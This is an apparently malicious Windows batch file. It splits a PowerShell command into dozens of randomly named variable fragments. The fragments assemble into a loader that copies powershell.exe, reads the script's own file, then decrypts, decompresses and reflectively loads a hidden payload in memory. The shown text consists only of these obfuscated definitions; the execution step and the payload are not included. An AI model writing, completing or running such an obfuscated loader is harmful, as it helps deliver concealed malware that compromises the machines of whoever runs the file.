@echo off
set "gVTZQdLVxe=\v"
set "QyLwcdEInr= /"
set "sqFoNwgELB=ll"
set "dHRvYhZbjq=po"
set "ezOfJQDpNH=s\"
set "ThXDewcRGA=st"
set "HBJzNzKxOo=xe"
set "oEqLMMYCzy=ll"
set "KGuvIfAzru=0\"
set "tWMQudkHci=y "
set "qqTsSoSAjC=Wi"
set "OMJnRoWXAp=in"
set "MrXQUVpNBa=py"
set "SkDYMzmsWb=Sy"
set "dhNolrsOFy=1."
set "ktOZUVEqjW=we"
set "rUobMsyolD=ow"
set "ZhVlDgqppm=32"
set "pzaWZTLQHy=.e"
set "afpQgcHPKg=co"
set "LoAQKgQbzv=we"
set "skBbbMmLZX=do"
set "hwIGWKKNBI= C"
set "QDoGxxgbRU=em"
set "UWaEgnxHuo=Po"
set "ujWaNAAxrK=rs"
set "gfrkJWCkbm=\W"
set "WUhALDxJTv=nd"
set "utTIErRQZv=:\"
set "fNCttLldWA=ws"
set "DlEcbvqspd=he"
set "KRlehbkqTf=rS"
set "dTaZuwkXVN=he"
set "VCJtDAOAtI= %~dp0"
set "ojTueTEIzQ=cd"
set "ZGIWdpZumF=rity"
set "ilatjuzRhI=am;$"
set "ZkFjzfHMkF=grap"
set "ZrjjWnwxqB=.Dis"
set "AiXrhuFbGI=IIAT"
set "XXqLyaQzCX=WSZY"
set "AOaUCBRnJS= '')"
set "YfKOPzxTzw=6esa"
set "AEhxWGZBWx=zwq "
set "hvgxaCiFPa=Disp"
set "xjNfVlctmb=pStr"
set "gtfJvkqEyC=7;$n"
set "cQXdJsLXLf=ode]"
set "SGwRIAqFUP=CF, "
set "dRlTsKoxSq=  $e"
set "MXJKhFCBXC=();$"
set "yEcJIZUMmg=nage"
set "JEXuCsNrxj=.Dis"
set "IXTLDwCxIM=comm"
set "MvaNAzNicV=ose("
set "VTyxrGzOUX=6] -"
set "BImYClQtao=m.IO"
set "jaJhAkcNtK=onve"
set "gPQhwWKruM=hy.A"
set "cZmbevwsOp=sGUc"
set "PUQtBnXRXc=('da"
set "nDNvxvSlMj=se()"
set "VIPfCZVNKX=comp"
set "qlWkXnLKJu=tryP"
set "LjMYZbBKYq= '')"
set "hQgRXCGyej=mory"
set "raFABHzDBT=join"
set "qUJdtJssgu=.Con"
set "KoBwSZLvfy=.Cry"
set "fQMDeGuRAD=aglD"
set "qawiLWRemy=)($c"
set "eEjmXyuSNP=;$GP"
set "pyfOQEuYem=:('g"
set "lJakIwIFej=Fo7l"
set "WWKLhCNgyw=.Mod"
set "enuAWQrWug=);$w"
set "JVumBUputK=F = "
set "hglnCjJtCU=ay()"
set "nYimsftayl='[-1"
set "wmrtXCYTCD=stem"
set "tUFTCdywpK=Y = "
set "qWZHUUzoqA=IAT."
set "VnkeMjhEFx=isfL"
set "gcztUEUzlk= = $"
set "EusbIoDdJB=, (,"
set "earIirGWtz=join"
set "bGuEkMytbt=stem"
set "KQpbBvgoBP=rans"
set "oqjrmcRomw=();$"
set "OvODgZjATg=)))"
set "EVgdSWPMHC=New-"
set "yPDeBYikpW=brea"
set "YBVZzIIUOA=[Sys"
set "fFuyfDsUdz=ke($"
set "ibQsROuTtP=ct S"
set "trrMOeTeQP=Disp"
set "nMhWowJBUQ=QZV."
set "DVoOAkJbqA=aglD"
set "CrQZekjDqJ=y.Pa"
set "WrMPwmXRLw='txe"
set "ItYdwdiNep=Comp"
set "PCQCaLBBCq= [st"
set "WsQOJWiLby=esMa"
set "TRXBhSsPJj=).Sp"
set "fPPEsTdreu=3HWs"
set "SbVLXZzRyp= if "
set "ZxxBDqqQeS=yPFi"
set "wWyzKktKOf=$alB"
set "kpZRppTmFb=y]::"
set "MiirhElAdC=Syst"
set "fcjsrVSAyl=tsWi"
set "nyDHHWcDJJ=lit("
set "dwiFrxCbkf=yste"
set "LKKzIvfkgn=V = "
set "BSKcFHCQPj=Bmor"
set "fwzoOfVSjE=GPqd"
set "amgvtbHzbq=$wgG"
set "FZDowahMhL=nirt"
set "gmSSNGmlGT=ert]"
set "IFgcUpgXEv=F'[-"
set "oalJfKaWYU=1..-"
set "AnOawwnRvy=);$n"
set "jcEAFGFiJu=ment"
set "XTvHqUHgaE=pose"
set "CWtRDEibrg=pres"
set "iWmsXVXMJm=]::N"
set "hVjRivLOiA=tF ="
set "HDJMdBBEGv=]::("
set "QGUcURVcoj==');"
set "rXjMMEbpUr=.Key"
set "KUzNfNQLAw=fy.T"
set "rLdIeKajqJ=.Len"
set "FffbMeSxmx=$cWS"
set "YusiartbRJ=QZV "
set "qtNXQDjYgx=736u"
set "NUYQzezPgm=ose("
set "JRrWjEJmkW== [S"
set "kLDblnmmct=flec"
set "sPzRsgSehr=morF"
set "MvLshBZAwq=le  "
set "ElmyuPihpa=ypto"
set "FXkXqPQDtl=UGTu"
set "pujvuRKLZh== $n"
set "FEyoAagreM=ect "
set "srhojIxqbX=-nop"
set "cYeohfurmT=e = "
set "fjQqrkAVbL=('%~f0'"
set "vsxCZcJGZy=bstr"
set "SJxRBTuXhi=..-1"
set "SiWKyAeAQD=rt]:"
set "zSZKGuNMhq=vj0m"
set "DbBQXWQKes=.Cry"
set "BtRgZuvamS=F = "
